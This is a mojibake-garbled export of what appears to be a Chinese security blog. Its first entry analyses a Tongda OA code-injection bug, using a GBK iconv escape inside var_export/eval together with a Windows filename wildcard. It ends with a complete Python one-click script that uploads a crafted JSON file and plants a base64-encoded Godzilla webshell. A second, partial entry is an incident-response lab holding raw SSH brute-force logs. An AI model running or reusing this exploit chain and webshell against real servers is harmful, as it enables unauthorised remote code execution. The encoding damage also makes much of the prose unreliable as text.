ä¸ºè¿™æ˜¯ä¸ªjsonæ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨å‰é¢çš„acceptData()æ–¹æ³•ä¸­è¿›è¡Œäº†json_decode()ï¼Œæ‰€ä»¥æ–‡ä»¶å†…å®¹éœ€è¦ä¸ºjsonæ ¼å¼ï¼ŒåŒæ—¶ä¸ºäº†æ»¡è¶³è·³è½¬åˆ°backDataAnalysisæ–¹æ³•ï¼Œæ„é€ å¦‚ä¸‹\n&#123;&quot;modular&quot;:&quot;AllVariable&quot;,&quot;dataAnalysis&quot;:&quot;&#123;\\&quot;aaa\\&quot;:\\&quot;bbb\\&quot;&#125;&quot;&#125;\n\næŒ‰ç…§æºç å†™ä¸€ä¸ªæµ‹è¯•è„šæœ¬,å¦‚ä¸‹\n&lt;?php$BackData = array(&quot;modular&quot;=&gt;&quot;AllVariable&quot;,&quot;dataAnalysis&quot;=&gt;&quot;&#123;\\&quot;aaa\\&quot;:\\&quot;bbb\\&quot;&#125;&quot;);var_dump($BackData);dotast($BackData);function dotast($BackData)&#123;;    $variableData = $BackData[&#x27;dataAnalysis&#x27;];    $variableData = json_decode($variableData, true);    echo(iconv(&#x27;UTF-8&#x27;, &#x27;GBK&#x27;, var_export($variableData, true) . &#x27;;&#x27;));    $variableData = eval(&#x27;return &#x27; . iconv(&#x27;UTF-8&#x27;, &#x27;GBK&#x27;, var_export($variableData, true) . &#x27;;&#x27;));&#125;dotast($BackData);?&gt;\n\n\nå¦‚æœæˆ‘ä»¬èƒ½åœ¨bbbå¤„é€ƒé€¸å‡ºå•å¼•å·ï¼Œé—­åˆå‰©ä¸‹çš„è¯­å¥ï¼Œå°±å¯ä»¥å®ç°ä»£ç æ‰§è¡Œï¼Œå³æƒ³å®ç°å¦‚ä¸‹ä»£ç æ•ˆæœ\n&lt;?phpreturn array (  &#x27;a&#x27; =&gt; &#x27;bbb&#x27;,eval(xxxx));/*&#x27;,);\n\nå³ä½¿åŠ ä¸Šä¸€ä¸ªå•å¼•å·,å› ä¸ºè½¬ä¹‰ä¹Ÿä¼šé€ƒé€¸å¤±è´¥,\n&lt;?phpreturn array (  &#x27;a&#x27; =&gt; &#x27;bbb\\&#x27;,eval(xxxx));/*&#x27;,);\n\nå¦‚æœå†å¤šå‡ºä¸€ä¸ªè½¬ä¹‰ç¬¦å·å‘¢ï¼Ÿå¤šå‡ºçš„è½¬ä¹‰ç¬¦ä¼šå°†ç¬¬äºŒä¸ª\\è¿›è¡Œè½¬ä¹‰ï¼Œå®ç°å•å¼•å·é—­åˆï¼ŒæˆåŠŸé€ƒé€¸ã€‚æ‰€ä»¥æˆ‘ä»¬æ¥ä¸‹æ¥éœ€è¦æƒ³åŠæ³•æ„é€ å‡ºä¸€ä¸ªè½¬ä¹‰ç¬¦\n&lt;?phpreturn array (  &#x27;a&#x27; =&gt; &#x27;bbb\\\\&#x27;,eval(xxxx));/*&#x27;,);\n\næ³¨æ„çœ‹å‰é¢çš„ä»£ç echo(iconv(&#39;UTF-8&#39;, &#39;GBK&#39;, var_export($variableData, true) . &#39;;&#39;));ï¼Œç²¾å½©çš„åœ°æ–¹åœ¨äºè¿™é‡Œä½¿ç”¨äº†iconv()æŠŠutf-8ç¼–ç è½¬æˆGBKç¼–ç ï¼Œæˆ‘ä»¬å†™ä¸€ä¸ª python è‡ªåŠ¨è„šæœ¬å¸®æˆ‘ä»¬å¯»æ‰¾å“ªäº›æ±‰å­—å¯ä»¥åœ¨è¿›è¡Œè½¬æ¢åæœ«å°¾å¸¦\\ç¬¦å·\nimport randomdef Unicode():    val = random.randint(0x4e00, 0x9fbf)    return chr(val)while 1:    create_s = Unicode()    for i in create_s:        test = i.encode(&#x27;gbk&#x27;)        for j in test:            if ascii(j) == &#x27;92&#x27;:                print(&#x27;ok:&#x27;, i)                &quot;&quot;&quot;                è¦¾                &quot;&quot;&quot;\n\nä½¿ç”¨æ±‰å­—è¦¾ä¸€æšï¼Œæ„æˆå¦‚ä¸‹phpæµ‹è¯•è„šæœ¬\n&lt;?php$BackData = array(&quot;modular&quot;=&gt;&quot;AllVariable&quot;,&quot;evil&quot;=&gt;&quot;ZmlsZV9wdXRfY29udGVudHMoJ2RvdGFzdC5waHAnLCc8P3BocCBwaHBpbmZvKCk7Jyk7&quot;,&quot;dataAnalysis&quot;=&gt;&quot;&#123;\\&quot;aaa\\&quot;:\\&quot;è¦¾&#x27;,eval(base64_decode(\\$BackData[evil])));/*\\&quot;&#125;&quot;);var_dump($BackData);dotast($BackData);function dotast($BackData)&#123;;    $variableData = $BackData[&#x27;dataAnalysis&#x27;];    $variableData = json_decode($variableData, true);    //var_dump($variableData);    echo(iconv(&#x27;UTF-8&#x27;, &#x27;GBK&#x27;, var_export($variableData, true) . &#x27;;&#x27;));    $variableData = eval(&#x27;return &#x27; . iconv(&#x27;UTF-8&#x27;, &#x27;GBK&#x27;, var_export($variableData, true) . &#x27;;&#x27;));&#125;dotast($BackData);?&gt;\n\nè¿è¡Œä¹‹åç¡®å®ç”Ÿæˆäº†dotast.php\n\nç»„åˆé“¾æˆ‘ä»¬å·²ç»çŸ¥é“/mobile/api/api.ali.phpå¯ä»¥ä¸Šä¼  json æ–‡ä»¶ï¼Œè€Œinc\\package\\work.phpå¯ä»¥å®ç°è¯»å– json æ–‡ä»¶ï¼Œå¯ä»¥ç»„åˆèµ·æ¥å½¢æˆä¸€æ¡ä»£ç æ‰§è¡Œçš„åˆ©ç”¨é“¾ã€‚ä½†è¿˜æœ‰ä¸€ä¸ªé—®é¢˜éœ€è¦è§£å†³ï¼Œå°±æ˜¯ä¸Šä¼ çš„æ–‡ä»¶åæ ¼å¼ä¸­å­˜åœ¨ä¸€ä¸ªéšæœºæ•°,æ— æ³•çŒœæµ‹,ä¹Ÿä¸èƒ½ç”¨?é€šé…ç¬¦\nä½†å¯ä»¥åˆ©ç”¨ windows ä¸Šçš„ä¸€ä¸ªç‰¹æ€§\nwindowsç³»ç»Ÿåœ¨å¤„ç†æ–‡ä»¶åçš„æ—¶å€™ï¼ŒFindFirstFileExW()/FindFirstFile()è¿™ä¸¤ä¸ªAPIä¼šå¯¹&lt; &gt; &quot;è¿™ä¸‰ä¸ªå­—ç¬¦åšç‰¹æ®Šå¤„ç†ï¼Œæ•ˆæœåˆ†åˆ«å¯¹åº”Linuxä¸‹çš„é€šé…ç¬¦* ? .\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨&gt;æ¥ä»£æ›¿?å®ç°åŒ¹é…æ–‡ä»¶ï¼Œå¦‚æ­¤ä¾¿å¯æˆåŠŸæ„é€ å‡ºä¸€æ¡å‰å° getshell åˆ©ç”¨é“¾ã€‚æœ€åä½¿ç”¨ python ç¼–å†™ä¸€é”® getshell è„šæœ¬\nimport requestsimport timeurl = &quot;URL&quot;shell = &quot;ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2RvdGFzdC5waHAnLGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFLUUhObGMzTnBiMjVmYzNSaGNuUW9LVHNLUUhObGRGOTBhVzFsWDJ4cGJXbDBLREFwT3dwQVpYSnliM0pmY21Wd2IzSjBhVzVuS0RBcE93cG1kVzVqZEdsdmJpQmxibU52WkdVb0pFUXNKRXNwZXdvZ0lDQWdabTl5S0NScFBUQTdKR2s4YzNSeWJHVnVLQ1JFS1Rza2FTc3JLU0I3Q2lBZ0lDQWdJQ0FnSkdNZ1BTQWtTMXNrYVNzeEpqRTFYVHNLSUNBZ0lDQWdJQ0FrUkZza2FWMGdQU0FrUkZza2FWMWVKR003Q2lBZ0lDQjlDaUFnSUNCeVpYUjFjbTRnSkVRN0NuMEtKSEJoYzNNOUozQmhjM01uT3dva2NHRjViRzloWkU1aGJXVTlKM0JoZVd4dllXUW5Pd29rYTJWNVBTY3pZelpsTUdJNFlUbGpNVFV5TWpSaEp6c0thV1lnS0dsemMyVjBLQ1JmVUU5VFZGc2tjR0Z6YzEwcEtYc0tJQ0FnSUNSa1lYUmhQV1Z1WTI5a1pTaGlZWE5sTmpSZlpHVmpiMlJsS0NSZlVFOVRWRnNrY0dGemMxMHBMQ1JyWlhrcE93b2dJQ0FnYVdZZ0tHbHpjMlYwS0NSZlUwVlRVMGxQVGxza2NHRjViRzloWkU1aGJXVmRLU2w3Q2lBZ0lDQWdJQ0FnSkhCaGVXeHZZV1E5Wlc1amIyUmxLQ1JmVTBWVFUwbFBUbHNrY0dGNWJHOWhaRTVoYldWZExDUnJaWGtwT3dvZ0lDQWdJQ0FnSUdsbUlDaHpkSEp3YjNNb0pIQmhlV3h2WVdRc0ltZGxkRUpoYzJsamMwbHVabThpS1QwOVBXWmhiSE5sS1hzS0lDQWdJQ0FnSUNBZ0lDQWdKSEJoZVd4dllXUTlaVzVqYjJSbEtDUndZWGxzYjJGa0xDUnJaWGtwT3dvZ0lDQWdJQ0FnSUgwS0NRbGxkbUZzS0NSd1lYbHNiMkZrS1RzS0lDQWdJQ0FnSUNCbFkyaHZJSE4xWW5OMGNpaHRaRFVvSkhCaGMzTXVKR3RsZVNrc01Dd3hOaWs3Q2lBZ0lDQWdJQ0FnWldOb2J5QmlZWE5sTmpSZlpXNWpiMlJsS0dWdVkyOWtaU2hBY25WdUtDUmtZWFJoS1N3a2EyVjVLU2s3Q2lBZ0lDQWdJQ0FnWldOb2J5QnpkV0p6ZEhJb2JXUTFLQ1J3WVhOekxpUnJaWGtwTERFMktUc0tJQ0FnSUgxbGJITmxld29nSUNBZ0lDQWdJR2xtSUNoemRISndiM01vSkdSaGRHRXNJbWRsZEVKaGMybGpjMGx1Wm04aUtTRTlQV1poYkhObEtYc0tJQ0FnSUNBZ0lDQWdJQ0FnSkY5VFJWTlRTVTlPV3lSd1lYbHNiMkZrVG1GdFpWMDlaVzVqYjJSbEtDUmtZWFJoTENSclpYa3BPd29nSUNBZ0lDQWdJSDBLSUNBZ0lIMEtmUW89IikpOw==&quot;dir_path1 = time.strftime(&#x27;%y%m&#x27;,time.localtime(time.time()))dir_path2 = &#x27;dotast&#x27;files = &#123;&quot;file&quot;:(dir_path2+&quot;.json&quot;,&#x27;&#123;&quot;modular&quot;:&quot;AllVariable&quot;,&quot;dotast&quot;:&quot;%s&quot;,&quot;dataAnalysis&quot;:&quot;&#123;\\\\&quot;abc\\\\&quot;:\\\\&quot;è¦¾\\&#x27;,eval(base64_decode($BackData[dotast])));/*\\\\&quot;&#125;&quot;&#125;&#x27;%shell, &quot;application/octet-stream&quot;)&#125;res1 = requests.post(url+&quot;/mobile/api/api.ali.php&quot;,files=files)for i in range(12,4,-1):    dir_path0 = &#x27;&gt;&#x27;*i    source_code = requests.get(url+&quot;/inc/package/work.php?id=../../../../../myoa/attach/approve_center/&#123;dir_path1&#125;/&#123;dir_path0&#125;.&#123;dir_path2&#125;&quot;.format(dir_path1=dir_path1,dir_path0=dir_path0,dir_path2=dir_path2))    if &quot;OK&quot; in source_code.text:        print(f&quot;\\033[1;34m[*]ç”Ÿæˆå“¥æ–¯æ‹‰shell: &#123;url&#125;/dotast.php  é»˜è®¤å¯†ç \\033[0,&quot;)        exit()\n\nå‚è€ƒé“¾æ¥https://forum.butian.net/share/2049\nå®¡è®¡æºç çš„å¸ˆå‚…çœŸå¼ºâ€¦\n","categories":["é€šè¾¾oa æ¼æ´åˆ†æ"],"tags":["é€šè¾¾oa æ¼æ´åˆ†æ"]},{"title":"ç„æœºåº”æ€¥ç›¸åº”","url":"/2025/10/09/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E7%9B%B8%E5%BA%94/","content":"ç„æœºåº”æ€¥å“åº”ç¬¬ä¸€ç«  åº”æ€¥å“åº”-Linuxæ—¥å¿—åˆ†æè´¦å·rootå¯†ç linuxrzssh root@IP1.æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºsshçš„rootå¸å·ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨&quot;,&quot;åˆ†å‰²2.sshçˆ†ç ´æˆåŠŸç™»é™†çš„IPæ˜¯å¤šå°‘ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨&quot;,&quot;åˆ†å‰²3.çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨&quot;,&quot;åˆ†å‰²4.ç™»é™†æˆåŠŸçš„IPå…±çˆ†ç ´äº†å¤šå°‘æ¬¡5.é»‘å®¢ç™»é™†ä¸»æœºåæ–°å»ºäº†ä¸€ä¸ªåé—¨ç”¨æˆ·ï¼Œç”¨æˆ·åæ˜¯å¤šå°‘\n\nä¸€èˆ¬sshç™»å½•æ—¥å¿—å­˜æ”¾åœ¨&#x2F;var&#x2F;log&#x2F;auth.logä¸‹,ä¹Ÿå¯ç”¨find -name æŸ¥è¯¢æ—¥å¿—æ‰€åœ¨ç›®å½•\nAug  1 07:40:47 linux-rz sshd[7461]: Invalid user test1 from 192.168.200.35 port 33874Aug  1 07:40:48 linux-rz sshd[7461]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:40:48 linux-rz sshd[7461]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.35 Aug  1 07:40:50 linux-rz sshd[7461]: Failed password for invalid user test1 from 192.168.200.35 port 33874 ssh2Aug  1 07:40:52 linux-rz sshd[7461]: Connection closed by invalid user test1 192.168.200.35 port 33874 [preauth]Aug  1 07:40:58 linux-rz sshd[7465]: Invalid user test2 from 192.168.200.35 port 51640Aug  1 07:41:01 linux-rz sshd[7465]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:41:01 linux-rz sshd[7465]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.35 Aug  1 07:41:04 linux-rz sshd[7465]: Failed password for invalid user test2 from 192.168.200.35 port 51640 ssh2Aug  1 07:41:07 linux-rz sshd[7465]: Connection closed by invalid user test2 192.168.200.35 port 51640 [preauth]Aug  1 07:41:09 linux-rz sshd[7468]: Invalid user test3 from 192.168.200.35 port 48168Aug  1 07:41:11 linux-rz sshd[7468]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:41:11 linux-rz sshd[7468]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.35 Aug  1 07:41:13 linux-rz sshd[7468]: Failed password for invalid user test3 from 192.168.200.35 port 48168 ssh2Aug  1 07:41:19 linux-rz sshd[7468]: Connection closed by invalid user test3 192.168.200.35 port 48168 [preauth]Aug  1 07:42:30 linux-rz sshd[7471]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.32  user=rootAug  1 07:42:32 linux-rz sshd[7471]: Failed password for root from 192.168.200.32 port 51888 ssh2Aug  1 07:42:33 linux-rz sshd[7471]: Connection closed by authenticating user root 192.168.200.32 port 51888 [preauth]Aug  1 07:42:49 linux-rz sshd[7288]: Received disconnect from 192.168.200.2 port 54682:11: disconnected by userAug  1 07:42:49 linux-rz sshd[7288]: Disconnected from user root 192.168.200.2 port 54682Aug  1 07:42:49 linux-rz sshd[7288]: pam_unix(sshd:session): session closed for user rootAug  1 07:42:49 linux-rz systemd-logind[440]: Session 6 logged out. Waiting for processes to exit.Aug  1 07:42:49 linux-rz systemd-logind[440]: Removed session 6.Aug  1 07:46:39 linux-rz sshd[7475]: Invalid user user from 192.168.200.2 port 36149Aug  1 07:46:39 linux-rz sshd[7475]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:46:39 linux-rz sshd[7475]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:46:41 linux-rz sshd[7475]: Failed password for invalid user user from 192.168.200.2 port 36149 ssh2Aug  1 07:46:45 linux-rz sshd[7475]: Connection closed by invalid user user 192.168.200.2 port 36149 [preauth]Aug  1 07:46:45 linux-rz sshd[7478]: Invalid user user from 192.168.200.2 port 44425Aug  1 07:46:45 linux-rz sshd[7478]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:46:45 linux-rz sshd[7478]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:46:47 linux-rz sshd[7478]: Failed password for invalid user user from 192.168.200.2 port 44425 ssh2Aug  1 07:46:48 linux-rz sshd[7478]: Connection closed by invalid user user 192.168.200.2 port 44425 [preauth]Aug  1 07:46:48 linux-rz sshd[7480]: Invalid user user from 192.168.200.2 port 38791Aug  1 07:46:48 linux-rz sshd[7480]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:46:48 linux-rz sshd[7480]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:46:50 linux-rz sshd[7480]: Failed password for invalid user user from 192.168.200.2 port 38791 ssh2Aug  1 07:46:52 linux-rz sshd[7480]: Connection closed by invalid user user 192.168.200.2 port 38791 [preauth]Aug  1 07:46:52 linux-rz sshd[7482]: Invalid user user from 192.168.200.2 port 37489Aug  1 07:46:52 linux-rz sshd[7482]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:46:52 linux-rz sshd[7482]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:46:54 linux-rz sshd[7482]: Failed password for invalid user user from 192.168.200.2 port 37489 ssh2Aug  1 07:46:54 linux-rz sshd[7482]: Connection closed by invalid user user 192.168.200.2 port 37489 [preauth]Aug  1 07:46:54 linux-rz sshd[7484]: Invalid user user from 192.168.200.2 port 35575Aug  1 07:46:54 linux-rz sshd[7484]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:46:54 linux-rz sshd[7484]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:46:56 linux-rz sshd[7484]: Failed password for invalid user user from 192.168.200.2 port 35575 ssh2Aug  1 07:46:57 linux-rz sshd[7484]: Connection closed by invalid user user 192.168.200.2 port 35575 [preauth]Aug  1 07:46:57 linux-rz sshd[7486]: Invalid user hello from 192.168.200.2 port 35833Aug  1 07:46:57 linux-rz sshd[7486]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:46:57 linux-rz sshd[7486]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:46:59 linux-rz sshd[7486]: Failed password for invalid user hello from 192.168.200.2 port 35833 ssh2Aug  1 07:46:59 linux-rz sshd[7486]: Connection closed by invalid user hello 192.168.200.2 port 35833 [preauth]Aug  1 07:47:00 linux-rz sshd[7489]: Invalid user hello from 192.168.200.2 port 37653Aug  1 07:47:00 linux-rz sshd[7489]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:47:00 linux-rz sshd[7489]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:47:02 linux-rz sshd[7489]: Failed password for invalid user hello from 192.168.200.2 port 37653 ssh2Aug  1 07:47:02 linux-rz sshd[7489]: Connection closed by invalid user hello 192.168.200.2 port 37653 [preauth]Aug  1 07:47:02 linux-rz sshd[7491]: Invalid user hello from 192.168.200.2 port 37917Aug  1 07:47:02 linux-rz sshd[7491]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:47:02 linux-rz sshd[7491]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:47:04 linux-rz sshd[7491]: Failed password for invalid user hello from 192.168.200.2 port 37917 ssh2Aug  1 07:47:05 linux-rz sshd[7491]: Connection closed by invalid user hello 192.168.200.2 port 37917 [preauth]Aug  1 07:47:05 linux-rz sshd[7493]: Invalid user hello from 192.168.200.2 port 41957Aug  1 07:47:05 linux-rz sshd[7493]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:47:05 linux-rz sshd[7493]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:47:08 linux-rz sshd[7493]: Failed password for invalid user hello from 192.168.200.2 port 41957 ssh2Aug  1 07:47:08 linux-rz sshd[7493]: Connection closed by invalid user hello 192.168.200.2 port 41957 [preauth]Aug  1 07:47:08 linux-rz sshd[7495]: Invalid user hello from 192.168.200.2 port 39685Aug  1 07:47:08 linux-rz sshd[7495]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:47:08 linux-rz sshd[7495]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:47:10 linux-rz sshd[7495]: Failed password for invalid user hello from 192.168.200.2 port 39685 ssh2Aug  1 07:47:11 linux-rz sshd[7495]: Connection closed by invalid user hello 192.168.200.2 port 39685 [preauth]Aug  1 07:47:11 linux-rz sshd[7497]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2  user=rootAug  1 07:47:13 linux-rz sshd[7497]: Failed password for root from 192.168.200.2 port 34703 ssh2Aug  1 07:47:15 linux-rz sshd[7497]: Connection closed by authenticating user root 192.168.200.2 port 34703 [preauth]Aug  1 07:47:16 linux-rz sshd[7499]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2  user=rootAug  1 07:47:18 linux-rz sshd[7499]: Failed password for root from 192.168.200.2 port 46671 ssh2Aug  1 07:47:18 linux-rz sshd[7499]: Connection closed by authenticating user root 192.168.200.2 port 46671 [preauth]Aug  1 07:47:18 linux-rz sshd[7501]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2  user=rootAug  1 07:47:20 linux-rz sshd[7501]: Failed password for root from 192.168.200.2 port 39967 ssh2Aug  1 07:47:20 linux-rz sshd[7501]: Connection closed by authenticating user root 192.168.200.2 port 39967 [preauth]Aug  1 07:47:20 linux-rz sshd[7503]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2  user=rootAug  1 07:47:22 linux-rz sshd[7503]: Failed password for root from 192.168.200.2 port 46647 ssh2Aug  1 07:47:23 linux-rz sshd[7503]: Connection closed by authenticating user root 192.168.200.2 port 46647 [preauth]Aug  1 07:47:23 linux-rz sshd[7505]: Accepted password for root from 192.168.200.2 port 46563 ssh2Aug  1 07:47:23 linux-rz sshd[7505]: pam_unix(sshd:session): session opened for user root by (uid=0)Aug  1 07:47:23 linux-rz systemd-logind[440]: New session 7 of user root.Aug  1 07:47:23 linux-rz sshd[7525]: Invalid user  from 192.168.200.2 port 37013Aug  1 07:47:23 linux-rz sshd[7525]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:47:23 linux-rz sshd[7525]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:47:26 linux-rz sshd[7525]: Failed password for invalid user  from 192.168.200.2 port 37013 ssh2Aug  1 07:47:28 linux-rz sshd[7525]: Connection closed by invalid user  192.168.200.2 port 37013 [preauth]Aug  1 07:47:28 linux-rz sshd[7528]: Invalid user  from 192.168.200.2 port 37545Aug  1 07:47:28 linux-rz sshd[7528]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:47:28 linux-rz sshd[7528]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:47:30 linux-rz sshd[7528]: Failed password for invalid user  from 192.168.200.2 port 37545 ssh2Aug  1 07:47:30 linux-rz sshd[7528]: Connection closed by invalid user  192.168.200.2 port 37545 [preauth]Aug  1 07:47:30 linux-rz sshd[7530]: Invalid user  from 192.168.200.2 port 39111Aug  1 07:47:30 linux-rz sshd[7530]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:47:30 linux-rz sshd[7530]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:47:32 linux-rz sshd[7530]: Failed password for invalid user  from 192.168.200.2 port 39111 ssh2Aug  1 07:47:32 linux-rz sshd[7530]: Connection closed by invalid user  192.168.200.2 port 39111 [preauth]Aug  1 07:47:33 linux-rz sshd[7532]: Invalid user  from 192.168.200.2 port 35173Aug  1 07:47:33 linux-rz sshd[7532]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:47:33 linux-rz sshd[7532]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:47:35 linux-rz sshd[7532]: Failed password for invalid user  from 192.168.200.2 port 35173 ssh2Aug  1 07:47:37 linux-rz sshd[7532]: Connection closed by invalid user  192.168.200.2 port 35173 [preauth]Aug  1 07:47:37 linux-rz sshd[7534]: Invalid user  from 192.168.200.2 port 45807Aug  1 07:47:37 linux-rz sshd[7534]: pam_unix(sshd:auth): check pass; user unknownAug  1 07:47:37 linux-rz sshd[7534]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.2 Aug  1 07:47:39 linux-rz sshd[7534]: Failed password for invalid user  from 192.168.200.2 port 45807 ssh2Aug  1 07:47:41 linux-rz sshd[7534]: Connection closed by invalid user  192.168.200.2 port 45807 [preauth]Aug  1 07:50:29 linux-rz sshd[7505]: pam_unix(sshd:session): session closed for user rootAug  1 07:50:29 linux-rz systemd-logind[440]: Session 7 logged out. Waiting for processes to exit.Aug  1 07:50:29 linux-rz systemd-logind[440]: Removed session 7.Aug  1 07:50:37 linux-rz sshd[7539]: Accepted password for root from 192.168.200.2 port 48070 ssh2Aug  1 07:50:37 linux-rz sshd[7539]: pam_unix(sshd:session): session opened for user root by (uid=0)Aug  1 07:50:37 linux-rz systemd-logind[440]: New session 8 of user root.Aug  1 07:50:45 linux-rz useradd[7551]: new group: name=test2, GID=1000Aug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/shAug  1 07:50:52 linux-rz passwd[7563]: pam_unix(passwd:chauthtok): password changed for test2Aug  1 07:50:56 linux-rz sshd[7539]: Received disconnect from 192.168.200.2 port 48070:11: disconnected by userAug  1 07:50:56 linux-rz sshd[7539]: Disconnected from user root 192.168.200.2 port 48070Aug  1 07:50:56 linux-rz sshd[7539]: pam_unix(sshd:session): session closed for user rootAug  1 07:50:56 linux-rz systemd-logind[440]: Session 8 logged out. Waiting for processes to exit.Aug  1 07:50:56 linux-rz systemd-logind[440]: Removed session 8.Aug  1 07:52:57 linux-rz sshd[7606]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.200.31  user=rootAug  1 07:52:59 linux-rz sshd[7606]: Failed password for root from 192.168.200.31 port 40364 ssh2Aug  1 07:53:01 linux-rz sshd[7606]: Connection closed by authenticating user root 192.168.200.31 port 40364 [preauth]Aug  1 08:01:26 linux-rz sshd[748]: Received disconnect from 192.168.200.2 port 50378:11: disconnected by userAug  1 08:01:26 linux-rz sshd[748]: Disconnected from user root 192.168.200.2 port 50378Aug  1 08:01:26 linux-rz sshd[748]: pam_unix(sshd:session): session closed for user rootAug  1 08:01:26 linux-rz systemd-logind[440]: Session 3 logged out. Waiting for processes to exit.Aug  1 08:01:26 linux-rz systemd-logind[440]: Removed session 3.Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: new group: name=debian, GID=1001Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: new user: name=debian, UID=1001, GID=1001, home=/home/debian, shell=/bin/bashAug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;adm&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;dialout&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;cdrom&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;floppy&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;sudo&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;audio&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;dip&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;video&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;plugdev&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to group &#x27;netdev&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;adm&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;dialout&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;cdrom&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;floppy&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;sudo&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;audio&#x27;Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: add &#x27;debian&#x27; to shadow group &#x27;dip&#x27;Aug 